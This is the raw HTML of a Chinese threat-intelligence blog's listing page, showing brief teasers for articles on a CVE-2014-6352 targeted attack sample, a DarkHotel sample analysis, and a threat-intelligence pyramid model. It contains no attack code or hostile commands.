<!DOCTYPE html><html data-n-head="" data-n-head-ssr><meta data-n-head="true" charset="utf-8"><meta data-n-head="true" content="width=device-width,initial-scale=1" name="viewport"><meta data-n-head="true" content="Nuxt.js project" name="description" data-hid="description"><title data-n-head="true">360威胁情报中心</title><link href="/fav.ico" rel="icon" data-n-head="true" type="image/x-icon"><link href="/_nuxt/manifest.38f62477280dcc27df9e.js" rel="preload" as="script"><link href="/_nuxt/vendor.bundle.45eca4dc7fa9e1bc4361.js" rel="preload" as="script"><link href="/_nuxt/nuxt.bundle.8e9d53f64bed77ebfe81.js" rel="preload" as="script"><link href="/_nuxt/0.nuxt.bundle.2f45ca512d92831b456d.js" rel="prefetch"><link href="/_nuxt/1.nuxt.bundle.ddf9ea85dc483e3df228.js" rel="prefetch"><link href="/_nuxt/2.nuxt.bundle.ae682d6568221e03d161.js" rel="prefetch"><link href="/_nuxt/3.nuxt.bundle.55fb549cb8ff45291a32.js" rel="prefetch"><link href="/_nuxt/4.nuxt.bundle.34c699b301359d6a3c4d.js" rel="prefetch"><link href="/_nuxt/5.nuxt.bundle.1375829ca49ba88d696d.js" rel="prefetch"><style data-vue-ssr-id="1cbf7f39:0 198c0e1e:0 553d0417:0 ba3a09e0:0 ad307d5e:0 2e5c82ca:0 5dc9682e:0 01cb4693:0 69b5e360:0 ec18e8da:0">.progress[data-v-862bdd9c]{position:fixed;top:0;left:0;right:0;height:2px;width:0;-webkit-transition:width .2s,opacity .4s;-o-transition:width .2s,opacity .4s;transition:width .2s,opacity .4s;opacity:1;background-color:#efc14e;z-index:999999}.hljs ::-webkit-scrollbar{width:8px;height:10px;border-radius:2px;background-color:#839496}.hljs ::-webkit-scrollbar-track{background-color:#bebebe}.hljs ::-webkit-scrollbar-thumb,.hljs ::-webkit-scrollbar-track{border-radius:2px;-webkit-box-shadow:inset 0 0 6px rgba(0,0,0,.3)}.hljs ::-webkit-scrollbar-thumb{background-color:#789}html{font-family:Source Sans Pro,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Arial,sans-serif;font-size:16px;word-spacing:1px;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;-moz-osx-font-smoothing:grayscale;-webkit-font-smoothing:antialiased;-webkit-box-sizing:border-box;box-sizing:border-box}body{background-color:rgba(66,66,66,.05)}*,:after,:before{-webkit-box-sizing:border-box;box-sizing:border-box;margin:0;text-decoration:none}li{list-style-type:none}a:active,a:hover,a:link,a:visited{color:#0b1802}.main-body h1,.main-body h2,.main-body h3,.main-body h4,.main-body h5,.main-body h6{margin-top:0;margin-bottom:.5rem}.main-body p{margin-top:0;margin-bottom:1rem;font-size:15px;text-indent:25px;word-wrap:break-word}.main-body img{vertical-align:middle;border-style:none;margin:auto 20px auto auto;padding:3px;border-radius:3px;background-color:#e6e6d5;-webkit-box-shadow:0 1px 2px rgba(0,0,0,.15);box-shadow:0 1px 2px rgba(0,0,0,.15);border:1px solid #b9baa6}.main-body .text-center{text-align:center!important}.main-body table{border-collapse:collapse!important;width:100%;max-width:100%;margin:1em 0;background-color:transparent}.main-body table tbody+tbody{border-top:2px solid #e9ecef}.main-body table td,.main-body table th{padding:.5rem;font-size:.95em;border-collapse:collapse}.main-body table tr{border:1px solid #dfe8fe}.main-body table tr:nth-child(odd){background-color:#ecf1fe}.main-body table tr:nth-child(2n){background-color:#fdfdfd}.main-body table td{white-space:normal;word-break:break-all}.main-body code,.main-body kbd,.main-body pre,.main-body samp{font-family:Menlo,Monaco,Consolas,Liberation Mono,Courier New,monospace}.container[data-v-6f26dfdd]{margin:0 auto;max-width:1450px}.nav-bar[data-v-42857612]{height:60px;border-bottom:1px solid #d5d5d5}.nav-bar .ico-favicon[data-v-42857612]{height:28px;margin-top:16px;margin-left:108px;cursor:pointer}.nav-bar .ico-home[data-v-42857612]{width:32px;height:32px;display:inline-block;margin:16px 32px;float:right;cursor:pointer;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAACU0lEQVRYR+2XzZHaQBCFX48cAM4AStxNBmYzACSfDREYIjAbAcoA9mwkcARmM1jfocAZbADWPNfIDAtaCUmUXdhV6Cjm5+vX3Y+W4MqPXPl+XAzQWWxrSuvPJgCt1P2y23i+JJiLADqLbcuJ9RSCVnIp8RQ7arDsNp6qQlQG6IXrPiATIYTCoblQKAEFBDiKvOasCkRpgL3kEwH6BL5rpfo2YqOI0nomwDsCM63UqGxKSgGcSE4+xI4zTF9gAJ04DiDysUpKCgHSkhdJbNZXSUkuQJ7k+0inFHmMPDfIync6JZHnDvLqIhOgs9jWnVgvkio/kvxwMDkO/ebyXLFlpKS77DZ26T2vALz5ukORqQA1ggMreS/cmIrva6U6WQflwZh9AkwIPAs5SIOfAHjzTQDBJ3tY6LliJQfkR+i7SdtVfXrhZixAYloEgshzR/aMA0AvXK8E8h7kV4rUTUsZALMZ4K6o+M5BWQDTvuZckKvQb94lHmI3mugp2JnCsjAWQGm1mn9orKpGbtdbANHqTivdEqJu1cwswr8JkA7kBlCogOmCsr5+phWTLjA18P+lwP+ybf98g501nxdfQC0r4thxzD/hyVxw3AWVFUhfYp0ttyXJh9Bv9o9//9MAufn0wg0JPkZes30DuCnwTyoQK/U2bWqZTniYC8hueoA411L5XbBeCaUV+u4r78gEMOZDpb/Zjw6Ah6+e/axQN5Pv8ftkrUh7P/kcjIgird/TFe4jzx0XjmR2QQIh8ZCS7XhlZwMhDPwsb4YsHMvLXnTpuqsD/AKIkSQ/Gqk/IAAAAABJRU5ErkJggg==) no-repeat}.nav-bar .ico-home[data-v-42857612]:hover{background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAACRElEQVRYR+2XT5LSQBTGvy9B13gDbmBuIJSJ65kTGKqEciecQOYEsJxKrII5gboVLJgbzNwAb8Aah7ypjmnMNPlLaaFV9DLV3e/3vvcnr4kTL57YPo4G8JfSfP6Aj8qBbQNXsw43xzhzFEDvmzggpiQcZVQEdxB0wze8qwtRG6D3XXwIxhRQLAyUQUaYCCEghuFrzupAVAZQkj/bYUzAB3AvEXztsVKEFpThlwLMftoYVg1JJQBD8putjYFpIM6JHSYA3tYJSSmAKXmZxGp/nZDkAuRJnng6heA28Kg8PlhmSEKX3by8yAR4v5TW7gGfkyzfS566eBS4/FKUbGZI7AYurztcm2cOAPoLuRBgSqApRFdL3p/LAIRv2bjIuigPJjk3FmBDoGuCPwHoLWRC4IO+LHBJLbkAP0KXcdnVXf25jMBfTQuCSeBxqO/YA/TmsiLxSgRfSbRUSSkAdVgsrMuSrwgqBXCflOoqdNmJe4g+GHsvWKvE0jAaIAJWnzyu6nqu92uASNCxAEeIllYzMwn/JoDpyBmgVAFVBVX7ekEpxlWgcuD/C8G7ubQbDax180n1hWamxxGG5lyQroLaCphGdGcrKMmbwKX6Ze/XnwbIjWd/ISKC29Bj+wxwVuCfVGBr44XZ1LI74e+54NIcIIpKKq8K4p8b4AQeD3pHJoBqPhaxjOcH9egg9q8eIp4VWub35N/eVpMPgPQDxVHTFQRXgcdR6UimNygIIn54ZHe86sPBhsQsb4YsHcur2zlu58kBHgGcWwk/vbbC3wAAAABJRU5ErkJggg==) no-repeat}.disPic .pic[data-v-42857612]{background-color:#faa732;height:480px;width:100%}.disPic[data-v-94c37b20]{background:url(/_nuxt/img/banner2.87c117d.jpg);background-repeat:no-repeat;background-size:cover;height:480px}.disPic .text[data-v-94c37b20]{color:#fff;text-align:center}.disPic .line1[data-v-94c37b20]{font-family:Microsoft YaHei;font-weight:700;font-size:60px;padding-top:142px}.disPic .line2[data-v-94c37b20]{font-family:Microsoft YaHei;font-weight:400;margin-top:46px;font-size:30px}.disPic .line3[data-v-94c37b20]{margin-top:51px;font-size:27px;font-family:LilyUPC;white-space:pre}.left-con[data-v-a7c4b6ea]{height:100%;width:100%;float:left}.main-part[data-v-a7c4b6ea]{margin-right:348px}.art-list[data-v-a7c4b6ea],.paging[data-v-a7c4b6ea]{margin:20px 20px auto 108px}.paging[data-v-a7c4b6ea]{padding-bottom:20px;border-bottom:1px solid #efefef}.paging .pag-btn[data-v-a7c4b6ea]{line-height:40px;height:40px;color:#53addd;text-align:center;width:180px;border:1px solid #53addd;border-radius:2px;cursor:pointer;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;font-size:14px}.paging .pag-btn .ico[data-v-a7c4b6ea]{width:14px;height:14px;padding-top:13px;display:inline-block;background-size:14px;background-repeat:no-repeat}.paging .pag-btn p[data-v-a7c4b6ea]{display:inline-block}.paging .btn-unable[data-v-a7c4b6ea],.paging .btn-unable[data-v-a7c4b6ea]:hover,.paging .pag-btn[data-v-a7c4b6ea]:active,.paging .pag-btn[data-v-a7c4b6ea]:hover{color:#fff}.paging .pag-btn[data-v-a7c4b6ea]:hover{background-color:#72c4f0;border-bottom:1px solid #72c4f0}.paging .pag-btn[data-v-a7c4b6ea]:active{background-color:#409ed0}.paging .btn-unable[data-v-a7c4b6ea],.paging .btn-unable[data-v-a7c4b6ea]:hover{background-color:#dadee5;border:1px solid #dadee5;cursor:not-allowed}.paging .left[data-v-a7c4b6ea]{float:left}.paging .left p[data-v-a7c4b6ea]{padding-left:7px}.paging .right[data-v-a7c4b6ea]{float:right}.paging .right p[data-v-a7c4b6ea]{padding-right:7px}.paging .mid[data-v-a7c4b6ea]{text-align:center;line-height:40px;height:40px;color:#979996;margin:auto 200px;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;cursor:default}@media screen and (min-width:550px) and (max-width:950px){.main-part .paging[data-v-a7c4b6ea],.main-part[data-v-a7c4b6ea]{margin-right:108px}.main-part .paging .left[data-v-a7c4b6ea],.main-part .paging .right[data-v-a7c4b6ea]{width:25%}.main-part .paging .mid[data-v-a7c4b6ea]{margin:auto 30%}}@media screen and (min-width:200px) and (max-width:550px){.main-part[data-v-a7c4b6ea],.paging[data-v-a7c4b6ea]{margin:20px 40px}.main-part .art-list[data-v-a7c4b6ea],.paging .art-list[data-v-a7c4b6ea]{margin:0}.paging .left[data-v-a7c4b6ea],.paging .right[data-v-a7c4b6ea]{width:25%}.paging .mid[data-v-a7c4b6ea]{margin:auto 30%}}.art-container[data-v-4113267b]{margin-top:16px;padding-bottom:16px;width:100%;height:216px;position:relative;border-bottom:1px solid #deded7}.art-container .text-box[data-v-4113267b]{margin-left:320px;top:0}.art-container .text-box .brief[data-v-4113267b]{text-indent:25px;display:-webkit-box;-webkit-line-clamp:4;-webkit-box-orient:vertical;overflow:hidden;max-height:108px}.art-container .text-box .href[data-v-4113267b]{cursor:pointer;color:#53addd;text-indent:25px}.art-container .text-box .ava img[data-v-4113267b]{border-radius:50%;height:48px;width:48px;float:left;margin:12px}.art-container .text-box .author[data-v-4113267b]{display:inline-block;line-height:32px}.art-container .text-box .author img[data-v-4113267b]{width:16px;height:16px}.art-container .pic-box[data-v-4113267b]{width:300px;max-height:200px;border-radius:5px;position:absolute;display:inline-block;top:0;overflow:hidden;cursor:pointer}.art-container .pic-box img[data-v-4113267b]{width:100%}@media screen and (min-width:950px) and (max-width:1250px){.art-container .text-box[data-v-4113267b]{margin-left:10px}.art-container .pic-box[data-v-4113267b]{width:0}}@media screen and (min-width:200px) and (max-width:950px){.art-container .text-box[data-v-4113267b]{margin-left:10px}.art-container .pic-box[data-v-4113267b]{width:0}}.title-home[data-v-552f8598]{font-family:sans-serif;line-height:32px;font-size:24px;color:#0b1802;cursor:pointer;max-height:32px;overflow:hidden;-o-text-overflow:ellipsis;text-overflow:ellipsis}.title-home[data-v-552f8598]:hover{text-shadow:2px 3px 1px #d0d0d0}.title-detail[data-v-552f8598]{font-size:48px;color:#0b1802;font-family:Arial Rounded MT Bold;margin-top:48px;line-height:64px}@media screen and (min-width:550px) and (max-width:950px){.title-home div[data-v-552f8598]{overflow:hidden;-o-text-overflow:ellipsis;text-overflow:ellipsis;white-space:nowrap}}@media screen and (max-width:550px){.title-home div[data-v-552f8598]{overflow:hidden;-o-text-overflow:ellipsis;text-overflow:ellipsis;white-space:nowrap}}.tags[data-v-53a17526]{height:42px;padding-top:10px}.tag[data-v-53a17526]{background-color:#6aacd8;display:inline-block;height:22px;font-size:13px;color:#fefefe;font-family:sans-serif;padding:2px 6px;margin-right:8px;border-radius:2px}.tag[data-v-83f11450]{width:220px;float:left;margin-top:50px;margin-left:-311px;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.tag .tag-header[data-v-83f11450]{cursor:pointer;height:40px;line-height:40px;text-align:center;font-size:15px;color:#494b48;font-weight:700;font-family:monospace}.tag .tag-header .tag-header[data-v-83f11450]{width:110px;height:40px;border:1px solid #efefef;background-color:#fafafa}.tag .tag-header .tag-header[data-v-83f11450]:hover{background-color:#66bcff;color:#fff;border:1px solid #66bcff}.tag .tag-header .h-chosen[data-v-83f11450]{color:#fff;background-color:#47afff;border:1px solid #47afff}.tag .tag-header .h-left[data-v-83f11450]{float:left}.tag .tag-header .h-right[data-v-83f11450]{overflow:hidden}.tag .tag-body[data-v-83f11450]{border:1px solid #efefef;border-bottom-left-radius:1px;border-bottom-right-radius:1px}.tag .tag-body .tag-list[data-v-83f11450]{padding:10px;margin-bottom:0;cursor:pointer}.tag .tag-body .tag-list .tag-item[data-v-83f11450]{padding:2px 8px;color:#0b1802;font-size:13px;list-style:none}.tag .tag-body .tag-list .tag-item a[data-v-83f11450]{padding:4px;border-radius:2px;display:inline-block}.tag .tag-body .tag-list .item-chosen a[data-v-83f11450]{color:#fff;background-color:#53addd}.tag .tag-body .tag-list .tag-item:hover a[data-v-83f11450]{color:#fff;background-color:#72c4f0}@media screen and (min-width:550px) and (max-width:950px){.tag[data-v-83f11450]{visibility:hidden}}@media screen and (max-width:550px){.tag[data-v-83f11450]{visibility:hidden}}</style><body data-n-head=""><div data-server-rendered="true" id="__nuxt"><div class="progress" data-v-862bdd9c style="width:0%;height:2px;background-color:#3b8070;opacity:0"></div><div><section data-v-6f26dfdd><div data-v-42857612 data-v-6f26dfdd><div class="nav-bar" data-v-42857612><a href="/" data-v-42857612><img src="/_nuxt/img/blog-icon.f80549d.png" class="ico-favicon" data-v-42857612></a><div class="ico-home" data-v-42857612></div></div><div class="disPic" data-v-42857612 data-v-94c37b20><p class="text line1" data-v-94c37b20>数据驱动安全<p class="text line2" data-v-94c37b20>360威胁情报研究<p class="text line3" data-v-94c37b20>———————— DIG DEEP INTO SECURITY ————————</div></div><div class="container" data-v-6f26dfdd><div class="left-con" data-v-a7c4b6ea data-v-6f26dfdd><div class="main-part" data-v-a7c4b6ea><div class="art-list" data-v-a7c4b6ea><div class="art-container" data-v-4113267b data-v-a7c4b6ea><div class="pic-box" data-v-4113267b><img src="/uploads/2017/08/01/847ba7154379f2cd5d13599b5f1023bf.png" data-v-4113267b></div><div class="text-box" data-v-4113267b><div class="title-home" data-v-4113267b data-v-552f8598><a href="/articles/CVE-2014-6352-and-targeted-attack-sample" data-v-552f8598 tag="div">CVE-2014-6352漏洞及定向攻击样本分析</a></div><div class="ava" data-v-4113267b><img src="/uploads/2017/08/17/13296b2306bed22900c8f2ffd7d3242a.png" data-v-4113267b></div><div class="tags" data-v-4113267b data-v-53a17526><p class="tag" data-v-53a17526>CVE-2014-6352</div><div class="author" data-v-4113267b><a data-v-4113267b><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAC3klEQVRYR8VXy1EbQRDtVrG6AhEYIgBHAERgiMAiAtBhe4qTxXGHg0QEtiMAR4CIwMrAOALDFVQ819uapXbFrnZ2L0zVnKZn+vXvdY/KBy/9YP3SCUCWZccicqCq+yLCvRUMeBSRBYDFYDCYp2n6K9awKADe+5GITIPCewBzVX3gpiIAO9wicqyqeyLyCODcOfezDchaAN77fQA3IrItIrPhcDgbj8e0tnFNp9Ot5+fncxHh/qeqJ2a2aLrQCKBk9X2SJKM2xasKCOTl5eUHQwbg1Dl3WweiFgBjrao3AC6dc5M2N647z7JsoqrfAJzUgXgHgG4XkTsA123K+TiVx8ip6pmIHK2Gow4AE2thZsz4tct7P6eAmR1GyN4C2HPO7ZZlKwAYdwBMtp2YmHcBEJKTlXNuZsyNfFUAZFnGDJ+1ubS43AUA74SQfS174Q1AkXhJkmzHWM8HuwIIlcHSPErTNA/fGwDv/YzsFhPPvh4IXlio6tzMyBMVAHMyXKz7+3igCIOqHhaGlj2AplptyvCuIQigc1o3M7JrxQMox6atrPp64Orq6hDAnZnlxlc80AMA6fVLE9g6Jm0EwBJcrdE2LzCrl8slmbN2LZfLh4uLi7xjlhI35xrnXN7Kyx7onIRtAOvOQ2+oTUKW4YGZfe7zcOydLMvqy7APEcUqLeTWElGo0U5U3BVAcP/IzDg95etdM2KNJkmyG0vHsSCC9X9EZNzYjEJtPwD47Zw7iX08Rs57z5Il1b9Z/84DAQDnQDaK6K7YBoB9BsAoUHBlPlw7kqnqJE3TyzYF685DkzuLHsmKx8IfgIPD3XA4PO2aE2EA+c4xTERGnYbSEmuR5Ri7TVWdbWxsXLcBCexIi9lun/hX6DWWr9KniHAA/cR5UVVvX19fKx+TwWDAzwnnSIL+S/lytjeFKepnVFwOjSRXAmBfVTd5BuBJVZlcObhi2onJnU4AYh7sKvPhAP4DcXG0MGOi0foAAAAASUVORK5CYII=" data-v-4113267b></a>2016-06-15 , 黄朝文 ,事件追踪</div><div class="brief" data-v-4113267b>近期360天眼实验室捕获到一例针对印度的定向攻击样本，样本利用了沙虫漏洞的补丁绕过漏洞CVE-2014-6352，经分析确认后我们认为这是趋势科技在今年三月份发布的名为“Operation C-Major”APT攻击活动的新样本。关于C-Major行动的相关内容，有兴趣的读者可以在文后的参考链接中查看。本文主要对CVE-2014-6352漏洞做基本的分析并剖析一个现实中利用此漏洞执行定向攻击的案例。</div></div></div><div class="art-container" data-v-4113267b data-v-a7c4b6ea><div class="pic-box" data-v-4113267b><img src="/_nuxt/img/pic-1.3c14cf9.jpg" data-v-4113267b></div><div class="text-box" data-v-4113267b><div class="title-home" data-v-4113267b data-v-552f8598><a href="/articles/darkhotel-targeted-attack-sample-analysis" data-v-552f8598 tag="div">DarkHotel定向攻击样本分析</a></div><div class="ava" data-v-4113267b><img src="data:image/jpeg;base64,iVBORw0KGgoAAAANSUhEUgAAAHgAAAB4CAAAAAAcD2kOAAAAAXNCSVQI5gpbmQAAA4JJREFUaIHt2llP4zAQAOAZJy2UVu1StrvSVoju8f9/EluEQOXoUujdJB4eoAfU17guPKzzFCnjfIntOM7E2IXP2cQnuRGOcIQjHOEIRzjCEf6ALfUtiAgAAEQfCiPm42lWQFI6rKV+NnZ92FF/urrjyknNh/aAxeJ6/sq+0OV2WfLPYroodYnB+UJsHEKRnQ/4fVRfAvN/qoPivpe8uyJMendsWdu5ML8o4GSrCsXDfbIdnPTTY2Zt664U8y4kd/33h3F2o3ABkpuZumG4MOZdAIWMV0oXILkKAr+42zIOct2J8gFPVsOLv68772Tcqvv1ifohYMDlkPBGxkmmP1M+ZclquNxRynRQ1o9ROOK4GphStYydVC+HuGOtDHoZFxxX+xx7yEUQ2EcOAwOlnVWjOcm84doQTWlnte8i8+YUpsvkyVQJBvNkOmK1vblhWHItIMyQqRGsc/Fk+sqbCVgv01GWLeZE2V4/TjJVmoGmPjyZSqfcCa5Lj7DK8qDDHkaduqJZpqJ5xh++3Z4BgyyL6q8W/0PC+RNmOf0DACha6/k2DeolD9b9laK7Z2wmXq77u0wn+76c3cc5bTvvGw4sc4oHlVmlQ8q8wgFlZtlwMrdoMJlZEhHLp6tHdxeZ8/pGpOlkOpNrLLlTZCsCw4jyaTgGBNy8SX/ZEUacPIzemjvKTjDi032mUHeRXWAxvM2Fthd5ynYY88uZnvWWrbAY3GgqeTfZBovrJ01ma0fZAuPFzO56yeZaFJdzt6GJP4YZw0XPOZPDlo356gkjD82VjXDPpX09ZUMsTnmZK55sCh0x+wtLNt3xnOfyZFO6iZdNYcomuFnZo2wKk21mup8jmweQU15ilCObE2yHP/Ymm2Nk/du+ZEuIbLb2JNsi5Mn3/cjWAHnc5s9rHGR7ncjaOlUfUHZJsJV/V9nVbZWdEmzUbrv+FHf+rnIbZmTtT6NwoKn4ov6Dsr05/6oX2e1QmIdQkvVWKevSMqpoNQ0/5lxhAJH1HwF1NhE2miUJmC9lwjPDHJa1OEHI4eMEFTYRVBp1lACwkgl/JobWYa6KQCzG40mGGwsXCKh0VK0mq+73Iltcj+UYiFDMF1meSwJMkrRUPkjeLoDBvEtgcb0WoADgeq0GKbKKmHfB4nouuVFpm4fTM7C4/ouMjBul1uTq/7eeK8IRjnCEIxzhCEf447dnbTqmyC8I+uIAAAAASUVORK5CYII=" data-v-4113267b></div><div class="tags" data-v-4113267b data-v-53a17526><p class="tag" data-v-53a17526>DARKHOTEL<p class="tag" data-v-53a17526>APT</div><div class="author" data-v-4113267b><a data-v-4113267b><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAC3klEQVRYR8VXy1EbQRDtVrG6AhEYIgBHAERgiMAiAtBhe4qTxXGHg0QEtiMAR4CIwMrAOALDFVQ819uapXbFrnZ2L0zVnKZn+vXvdY/KBy/9YP3SCUCWZccicqCq+yLCvRUMeBSRBYDFYDCYp2n6K9awKADe+5GITIPCewBzVX3gpiIAO9wicqyqeyLyCODcOfezDchaAN77fQA3IrItIrPhcDgbj8e0tnFNp9Ot5+fncxHh/qeqJ2a2aLrQCKBk9X2SJKM2xasKCOTl5eUHQwbg1Dl3WweiFgBjrao3AC6dc5M2N647z7JsoqrfAJzUgXgHgG4XkTsA123K+TiVx8ip6pmIHK2Gow4AE2thZsz4tct7P6eAmR1GyN4C2HPO7ZZlKwAYdwBMtp2YmHcBEJKTlXNuZsyNfFUAZFnGDJ+1ubS43AUA74SQfS174Q1AkXhJkmzHWM8HuwIIlcHSPErTNA/fGwDv/YzsFhPPvh4IXlio6tzMyBMVAHMyXKz7+3igCIOqHhaGlj2AplptyvCuIQigc1o3M7JrxQMox6atrPp64Orq6hDAnZnlxlc80AMA6fVLE9g6Jm0EwBJcrdE2LzCrl8slmbN2LZfLh4uLi7xjlhI35xrnXN7Kyx7onIRtAOvOQ2+oTUKW4YGZfe7zcOydLMvqy7APEcUqLeTWElGo0U5U3BVAcP/IzDg95etdM2KNJkmyG0vHsSCC9X9EZNzYjEJtPwD47Zw7iX08Rs57z5Il1b9Z/84DAQDnQDaK6K7YBoB9BsAoUHBlPlw7kqnqJE3TyzYF685DkzuLHsmKx8IfgIPD3XA4PO2aE2EA+c4xTERGnYbSEmuR5Ri7TVWdbWxsXLcBCexIi9lun/hX6DWWr9KniHAA/cR5UVVvX19fKx+TwWDAzwnnSIL+S/lytjeFKepnVFwOjSRXAmBfVTd5BuBJVZlcObhi2onJnU4AYh7sKvPhAP4DcXG0MGOi0foAAAAASUVORK5CYII=" data-v-4113267b></a>2016-05-13 , 代慧平 ,事件追踪</div><div class="brief" data-v-4113267b>360天眼实验室追日团队持续发现与跟踪APT活动，相关的样本、IP、域名等数据只要一出现就会立即进入我们的视线。5月10日VirusTotal上有人提交了一个样本，安博士标记为DarkHotel相关。这个团伙在2014年被卡巴斯基做过一次暴光，但直到最近还一直非常活跃，下面我们来对VT上的这个样本做个简单的分析。</div></div></div><div class="art-container" data-v-4113267b data-v-a7c4b6ea><div class="pic-box" data-v-4113267b><img src="/uploads/2017/08/01/0e275715b71ac1ebf7c79054513124a2.png" data-v-4113267b></div><div class="text-box" data-v-4113267b><div class="title-home" data-v-4113267b data-v-552f8598><a href="/articles/level-of-threat-intelligence" data-v-552f8598 tag="div">威胁情报的层次分析</a></div><div class="ava" data-v-4113267b><img src="/uploads/2017/08/17/16949b71be4886f4dbebd52178a1a204.png" data-v-4113267b></div><div class="tags" data-v-4113267b data-v-53a17526></div><div class="author" data-v-4113267b><a data-v-4113267b><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAC3klEQVRYR8VXy1EbQRDtVrG6AhEYIgBHAERgiMAiAtBhe4qTxXGHg0QEtiMAR4CIwMrAOALDFVQ819uapXbFrnZ2L0zVnKZn+vXvdY/KBy/9YP3SCUCWZccicqCq+yLCvRUMeBSRBYDFYDCYp2n6K9awKADe+5GITIPCewBzVX3gpiIAO9wicqyqeyLyCODcOfezDchaAN77fQA3IrItIrPhcDgbj8e0tnFNp9Ot5+fncxHh/qeqJ2a2aLrQCKBk9X2SJKM2xasKCOTl5eUHQwbg1Dl3WweiFgBjrao3AC6dc5M2N647z7JsoqrfAJzUgXgHgG4XkTsA123K+TiVx8ip6pmIHK2Gow4AE2thZsz4tct7P6eAmR1GyN4C2HPO7ZZlKwAYdwBMtp2YmHcBEJKTlXNuZsyNfFUAZFnGDJ+1ubS43AUA74SQfS174Q1AkXhJkmzHWM8HuwIIlcHSPErTNA/fGwDv/YzsFhPPvh4IXlio6tzMyBMVAHMyXKz7+3igCIOqHhaGlj2AplptyvCuIQigc1o3M7JrxQMox6atrPp64Orq6hDAnZnlxlc80AMA6fVLE9g6Jm0EwBJcrdE2LzCrl8slmbN2LZfLh4uLi7xjlhI35xrnXN7Kyx7onIRtAOvOQ2+oTUKW4YGZfe7zcOydLMvqy7APEcUqLeTWElGo0U5U3BVAcP/IzDg95etdM2KNJkmyG0vHsSCC9X9EZNzYjEJtPwD47Zw7iX08Rs57z5Il1b9Z/84DAQDnQDaK6K7YBoB9BsAoUHBlPlw7kqnqJE3TyzYF685DkzuLHsmKx8IfgIPD3XA4PO2aE2EA+c4xTERGnYbSEmuR5Ri7TVWdbWxsXLcBCexIi9lun/hX6DWWr9KniHAA/cR5UVVvX19fKx+TwWDAzwnnSIL+S/lytjeFKepnVFwOjSRXAmBfVTd5BuBJVZlcObhi2onJnU4AYh7sKvPhAP4DcXG0MGOi0foAAAAASUVORK5CYII=" data-v-4113267b></a>2016-04-22 , 汪列军 ,安全观点</div><div class="brief" data-v-4113267b>威胁情报，近几年来兴起的安全热点，已经从理念到技术再到平台逐步开始落地。不管是老牌的安全公司还是新兴的厂商都正在这方面探索，包括可行的技术方案、交换标准及商业模式。本文着重为读者介绍一下我所理解的威胁情报的层次，结合自身的实践，提出了一个金字塔模型，希望有助于提升业界对威胁情报的认识。</div></div></div></div><div class="paging" data-v-a7c4b6ea><a class="btn-unable pag-btn left" data-v-a7c4b6ea>上一页 </a><a class="btn-unable pag-btn right" data-v-a7c4b6ea>下一页</a><div class="mid" data-v-a7c4b6ea>第 1/1 页</div></div></div></div><div class="tag" data-v-83f11450 data-v-6f26dfdd><div class="tag-header" data-v-83f11450><div class="tag-header h-chosen h-left" data-v-83f11450>标签</div><div class="tag-header h-right" data-v-83f11450>类别</div></div><div class="tag-body" data-v-83f11450><ul class="tag-list" data-v-83f11450><li class="tag-item item-chosen" data-v-83f11450><a data-v-83f11450>全部</a><li class="tag-item" data-v-83f11450><a data-v-83f11450>APT</a><li class="tag-item" data-v-83f11450><a data-v-83f11450>暗云</a><li class="tag-item" data-v-83f11450><a data-v-83f11450>暗云3</a><li class="tag-item" data-v-83f11450><a data-v-83f11450>海莲花</a><li class="tag-item" data-v-83f11450><a data-v-83f11450>OCEANLOTUS</a><li class="tag-item" data-v-83f11450><a data-v-83f11450>DARKCLOUD</a><li class="tag-item" data-v-83f11450><a data-v-83f11450>DARKHOTEL</a><li class="tag-item" data-v-83f11450><a data-v-83f11450>PAKISTAN</a><li class="tag-item" data-v-83f11450><a data-v-83f11450>ADWARE</a><li class="tag-item" data-v-83f11450><a data-v-83f11450>PETYA</a><li class="tag-item" data-v-83f11450><a data-v-83f11450>CVE-2014-6352</a><li class="tag-item" data-v-83f11450><a data-v-83f11450>OFFICE</a><li class="tag-item" data-v-83f11450><a data-v-83f11450>GAZA</a><li class="tag-item" data-v-83f11450><a data-v-83f11450>DOCX</a><li class="tag-item" data-v-83f11450><a data-v-83f11450>MBR</a><li class="tag-item" data-v-83f11450><a data-v-83f11450>WANNACRY</a><li class="tag-item" data-v-83f11450><a data-v-83f11450>HWORM</a><li class="tag-item" data-v-83f11450><a data-v-83f11450>TEMPLATE INJECTION</a><li class="tag-item" data-v-83f11450><a data-v-83f11450>FIN7</a><li class="tag-item" data-v-83f11450><a data-v-83f11450>RANSOM</a><li class="tag-item" data-v-83f11450><a data-v-83f11450>BACKDOOR</a><li class="tag-item" data-v-83f11450><a data-v-83f11450>FIREBALL</a><li class="tag-item item-chosen" data-v-83f11450 style="display:none"><a data-v-83f11450>全部</a><li class="tag-item" data-v-83f11450 style="display:none"><a data-v-83f11450>事件追踪</a><li class="tag-item" data-v-83f11450 style="display:none"><a data-v-83f11450>技术研究</a><li class="tag-item" data-v-83f11450 style="display:none"><a data-v-83f11450>安全观点</a><li class="tag-item" data-v-83f11450 style="display:none"><a data-v-83f11450>专题报告</a></ul></div></div></div></section></div></div><script type="text/javascript">window.__NUXT__={layout:"default",data:[{tagAllList:[[{tag:"全部"},{title:["Gaza Cybergang APT团伙新样本分析","FIN7 